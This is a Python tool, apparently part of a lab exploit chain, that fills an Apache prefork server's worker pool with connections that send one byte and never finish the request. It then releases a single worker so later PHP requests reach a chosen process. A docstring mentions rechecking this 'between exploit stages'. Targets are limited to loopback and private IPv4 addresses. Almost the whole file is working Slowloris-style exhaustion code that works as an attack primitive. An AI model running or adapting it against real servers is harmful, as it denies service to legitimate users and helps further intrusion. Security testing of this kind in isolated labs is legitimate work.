#!/usr/bin/env python3
"""Remote Apache-prefork worker discovery and single-lane selection.

Discovery deliberately stays outside PHP: holders contain only an incomplete
request-line byte, while liveness probes use Apache's server-wide ``OPTIONS *``
request target.  A profile runner may enter this context and then issue its
PHP requests through the one released lane.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import socket
import time
from dataclasses import dataclass, asdict
from pathlib import Path


class WorkerSelectionError(RuntimeError):
    pass


RFC1918 = tuple(ipaddress.ip_network(value) for value in (
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"))


def permitted_address(value: str) -> bool:
    address = ipaddress.ip_address(value)
    return address.is_loopback or (
        address.version == 4 and any(address in network for network in RFC1918)
    )


def require_private_target(host: str, port: int) -> list[str]:
    """Require an IPv4 literal in loopback/RFC1918; never resolve DNS."""
    try:
        address = ipaddress.ip_address(host)
    except ValueError as exc:
        raise WorkerSelectionError(
            "target must be a literal private IPv4 address") from exc
    if address.version != 4:
        raise WorkerSelectionError("target must be an IPv4 literal")
    if not permitted_address(str(address)):
        raise WorkerSelectionError(
            "public/non-RFC1918 target refused: " + str(address))
    return [str(address)]


def split_endpoint(value: str, default_port: int = 80) -> tuple[str, int]:
    if value.count(":") == 1:
        host, text = value.rsplit(":", 1)
        if host and text.isdigit():
            port = int(text)
            if 1 <= port <= 65535:
                return host, port
    if not value or ":" in value:
        raise ValueError("target must be IPv4-or-name[:port]")
    return value, default_port


def core_probe(host: str, port: int, timeout: float) -> str | None:
    """Return the HTTP status line, or None when no worker responds in time."""
    request = (
        "OPTIONS * HTTP/1.0\r\n"
        f"Host: {host}:{port}\r\n"
        "Connection: close\r\n\r\n"
    ).encode("ascii")
    try:
        with socket.create_connection((host, port), timeout=timeout) as stream:
            stream.settimeout(timeout)
            stream.sendall(request)
            response = bytearray()
            while b"\r\n" not in response and len(response) < 4096:
                block = stream.recv(4096 - len(response))
                if not block:
                    break
                response.extend(block)
    except (OSError, TimeoutError):
        return None
    if b"\r\n" not in response:
        return None
    return bytes(response).split(b"\r\n", 1)[0].decode("latin1", "replace")


def open_holder(host: str, port: int, timeout: float) -> socket.socket:
    stream = socket.create_connection((host, port), timeout=timeout)
    try:
        stream.settimeout(timeout)
        # This is not a complete HTTP request and cannot enter PHP.
        stream.sendall(b"G")
        return stream
    except Exception:
        stream.close()
        raise


@dataclass
class ProbeRecord:
    holders: int
    attempt: int
    status: str | None
    elapsed_seconds: float


class PreforkWorkerSelector:
    """Discover or occupy a prefork pool and release one verified lane."""

    def __init__(
        self,
        host: str,
        port: int,
        *,
        worker_count: int | None = None,
        release_index: int = 0,
        max_workers: int = 256,
        connect_timeout: float = 5.0,
        holder_settle: float = 0.12,
        probe_timeout: float = 0.35,
        confirm_timeout: float = 0.8,
        spawn_grace: float = 0.8,
        release_settle: float = 0.35,
        verify_unique_lane: bool = True,
        burst_threshold: int = 32,
        burst_settle: float = 4.0,
        burst_probe_timeout: float = 0.15,
        burst_open_settle: float = 0.003,
    ):
        if worker_count is not None and worker_count < 1:
            raise ValueError("worker_count must be positive")
        if max_workers < 1:
            raise ValueError("max_workers must be positive")
        self.host = host
        self.port = port
        self.resolved_addresses = require_private_target(host, port)
        self.requested_worker_count = worker_count
        self.release_index = release_index
        self.max_workers = max_workers
        self.connect_timeout = connect_timeout
        self.holder_settle = holder_settle
        self.probe_timeout = probe_timeout
        self.confirm_timeout = confirm_timeout
        self.spawn_grace = spawn_grace
        self.release_settle = release_settle
        self.verify_unique_lane_requested = verify_unique_lane
        self.burst_threshold = burst_threshold
        self.burst_settle = burst_settle
        self.burst_probe_timeout = burst_probe_timeout
        self.burst_open_settle = burst_open_settle
        self.sockets: list[socket.socket | None] = []
        self.probes: list[ProbeRecord] = []
        self.detected_worker_count: int | None = None
        self.lane_ready_status: str | None = None
        self.unique_lane_verified = False
        self.unique_lane_checks = 0
        self.discovery_mode = "known" if worker_count is not None else "sequential"
        self.started_ns: int | None = None

    def _record_probe(self, holders: int, attempt: int, timeout: float) -> str | None:
        started = time.monotonic()
        result = core_probe(self.host, self.port, timeout)
        self.probes.append(ProbeRecord(
            holders=holders,
            attempt=attempt,
            status=result,
            elapsed_seconds=time.monotonic() - started,
        ))
        return result

    def _open_one(self, settle: float | None = None) -> None:
        self.sockets.append(open_holder(
            self.host, self.port, self.connect_timeout))
        time.sleep(self.holder_settle if settle is None else settle)

    def _close_current_holders(self) -> None:
        for stream in self.sockets:
            if stream is not None:
                try:
                    stream.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                stream.close()
        self.sockets.clear()

    def _drain_core_queue(self) -> str:
        deadline = time.monotonic() + 8.0
        attempt = 4000
        while time.monotonic() < deadline:
            result = self._record_probe(0, attempt, self.confirm_timeout)
            attempt += 1
            if result is not None:
                return result
            time.sleep(0.05)
        raise WorkerSelectionError("Apache queue did not drain after burst")

    def _discover_burst(self) -> int:
        """Rapidly oversubscribe a large pool before header timeouts expire."""
        self.discovery_mode = "burst"
        baseline = self._record_probe(0, 0, max(1.0, self.confirm_timeout))
        if baseline is None:
            raise WorkerSelectionError("Apache core baseline probe did not respond")
        for _ in range(self.max_workers):
            self._open_one(self.burst_open_settle)
        time.sleep(self.burst_settle)

        # The cap must be above the configured worker maximum.
        for attempt, timeout in ((1, self.probe_timeout),
                                 (2, self.confirm_timeout),
                                 (3, self.confirm_timeout)):
            status = self._record_probe(self.max_workers, attempt, timeout)
            if status is not None:
                raise WorkerSelectionError(
                    f"worker saturation absent through max_workers={self.max_workers}")
            time.sleep(self.spawn_grace)

        detected = None
        for index in range(self.max_workers - 1, -1, -1):
            stream = self.sockets[index]
            if stream is not None:
                stream.close()
                self.sockets[index] = None
            closed = self.max_workers - index
            time.sleep(0.01)
            status = self._record_probe(
                self.max_workers - closed,
                2000 + closed,
                self.burst_probe_timeout,
            )
            if status is not None:
                detected = self.max_workers - closed + 1
                break
        if detected is None:
            raise WorkerSelectionError("burst release never exposed a worker")

        # Re-cage only the measured pool so the normal release/uniqueness path
        # below remains identical to small-pool selection.
        self._close_current_holders()
        self._drain_core_queue()
        for _ in range(detected):
            self._open_one(self.burst_open_settle)
        time.sleep(max(0.35, self.release_settle))
        return detected

    def _discover(self) -> int:
        if self.max_workers > self.burst_threshold:
            return self._discover_burst()
        self.discovery_mode = "sequential"
        baseline = self._record_probe(0, 0, max(1.0, self.confirm_timeout))
        if baseline is None:
            raise WorkerSelectionError("Apache core baseline probe did not respond")
        for count in range(1, self.max_workers + 1):
            self._open_one()
            first = self._record_probe(count, 1, self.probe_timeout)
            if first is not None:
                continue

            # Distinguish a temporarily empty spare pool from MaxRequestWorkers.
            time.sleep(self.spawn_grace)
            second = self._record_probe(count, 2, self.confirm_timeout)
            if second is not None:
                continue
            time.sleep(self.spawn_grace)
            third = self._record_probe(count, 3, self.confirm_timeout)
            if third is None:
                return count
        raise WorkerSelectionError(
            f"worker saturation absent through max_workers={self.max_workers}")

    def _open_exact(self, count: int) -> None:
        baseline = self._record_probe(0, 0, max(1.0, self.confirm_timeout))
        if baseline is None:
            raise WorkerSelectionError("Apache core baseline probe did not respond")
        settle = (self.burst_open_settle
                  if count > self.burst_threshold else self.holder_settle)
        for _ in range(count):
            self._open_one(settle)
        if count > self.burst_threshold:
            # Prefork creates children in bounded bursts. Do not release a
            # holder until the known pool has actually accepted all holders;
            # otherwise the freed child immediately accepts another queued
            # holder and no lane becomes available.
            deadline = time.monotonic() + 14.0
            consecutive = 0
            attempt = 5000
            while time.monotonic() < deadline:
                status = self._record_probe(
                    count, attempt,
                    self.probe_timeout if consecutive == 0
                    else self.confirm_timeout)
                attempt += 1
                if status is None:
                    consecutive += 1
                    if consecutive == 3:
                        break
                    time.sleep(self.spawn_grace)
                else:
                    consecutive = 0
                    time.sleep(0.35)
            if consecutive != 3:
                raise WorkerSelectionError(
                    f"known worker pool {count} did not saturate before timeout")

    def _wait_lane_ready(self) -> str:
        # Stock prefork reaches MaxRequestWorkers in bounded spawn bursts.  On
        # a busy Docker Desktop host, the final queued holders can take longer
        # than four seconds to be accepted.  Keep the selector bounded, but
        # allow the proved 150-worker profile enough time to expose the one
        # deliberately released lane.
        deadline = time.monotonic() + max(20.0, 20 * self.confirm_timeout)
        attempt = 10
        while time.monotonic() < deadline:
            result = self._record_probe(
                len(self.sockets), attempt, self.confirm_timeout)
            attempt += 1
            if result is not None:
                return result
            time.sleep(0.15)
        raise WorkerSelectionError("released worker lane did not become ready")

    def _verify_unique_lane(self) -> None:
        temporary = open_holder(
            self.host, self.port, self.connect_timeout)
        try:
            time.sleep(self.holder_settle)
            first = self._record_probe(
                self.detected_worker_count or len(self.sockets),
                100,
                self.probe_timeout,
            )
            if first is not None:
                raise WorkerSelectionError(
                    "more than one worker lane remained free")
            time.sleep(self.spawn_grace)
            second = self._record_probe(
                self.detected_worker_count or len(self.sockets),
                101,
                self.confirm_timeout,
            )
            if second is not None:
                raise WorkerSelectionError(
                    "worker pool expanded after selection")
            self.unique_lane_verified = True
            self.unique_lane_checks += 1
        finally:
            temporary.close()
        time.sleep(self.release_settle)
        self.lane_ready_status = self._wait_lane_ready()

    def assert_unique_lane(self) -> None:
        """Recheck the one-free-worker invariant between exploit stages.

        This catches a long-running unrelated request that ends after initial
        discovery, as well as a prefork parent that expands its pool later.
        The check remains Apache-core-only and never enters PHP.
        """
        if self.detected_worker_count is None:
            raise WorkerSelectionError("selector is not active")
        self._verify_unique_lane()

    def __enter__(self) -> "PreforkWorkerSelector":
        self.started_ns = time.time_ns()
        try:
            if self.requested_worker_count is None:
                count = self._discover()
            else:
                count = self.requested_worker_count
                self._open_exact(count)
            self.detected_worker_count = count
            if not 0 <= self.release_index < count:
                raise WorkerSelectionError(
                    f"release_index {self.release_index} outside 0..{count - 1}")
            released = self.sockets[self.release_index]
            if released is None:
                raise WorkerSelectionError("selected holder was already released")
            released.close()
            self.sockets[self.release_index] = None
            time.sleep(self.release_settle)
            self.lane_ready_status = self._wait_lane_ready()
            if self.verify_unique_lane_requested:
                self._verify_unique_lane()
            return self
        except Exception:
            self.close()
            raise

    def evidence(self) -> dict:
        return {
            "strategy": (
                "automatic Apache-core saturation; partial request-line holders; "
                "one released and uniqueness-tested lane"),
            "target_scope": "loopback-or-RFC1918-only",
            "resolved_addresses": self.resolved_addresses,
            "php_requests_during_discovery": 0,
            "requested_worker_count": self.requested_worker_count,
            "discovery_mode": self.discovery_mode,
            "detected_worker_count": self.detected_worker_count,
            "max_workers": self.max_workers,
            "release_index": self.release_index,
            "holders_started": len(self.sockets),
            "holders_remaining": sum(item is not None for item in self.sockets),
            "lane_ready_status": self.lane_ready_status,
            "unique_lane_verified": self.unique_lane_verified,
            "unique_lane_checks": self.unique_lane_checks,
            "started_ns": self.started_ns,
            "probes": [asdict(item) for item in self.probes],
        }

    def close(self) -> None:
        self._close_current_holders()

    def __exit__(self, *_):
        self.close()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("--workers", type=int)
    parser.add_argument("--max-workers", type=int, default=256)
    parser.add_argument("--release-index", type=int, default=0)
    parser.add_argument("--no-unique-check", action="store_true")
    parser.add_argument("--out", type=Path)
    args = parser.parse_args()
    host, port = split_endpoint(args.target)
    with PreforkWorkerSelector(
        host,
        port,
        worker_count=args.workers,
        max_workers=args.max_workers,
        release_index=args.release_index,
        verify_unique_lane=not args.no_unique_check,
    ) as selector:
        document = selector.evidence()
        if args.out:
            args.out.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
            args.out.write_text(json.dumps(document, indent=2) + "\n")
        print(json.dumps(document, indent=2))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, ValueError, WorkerSelectionError) as exc:
        print(f"stopped: {exc}", file=__import__("sys").stderr)
        raise SystemExit(1)
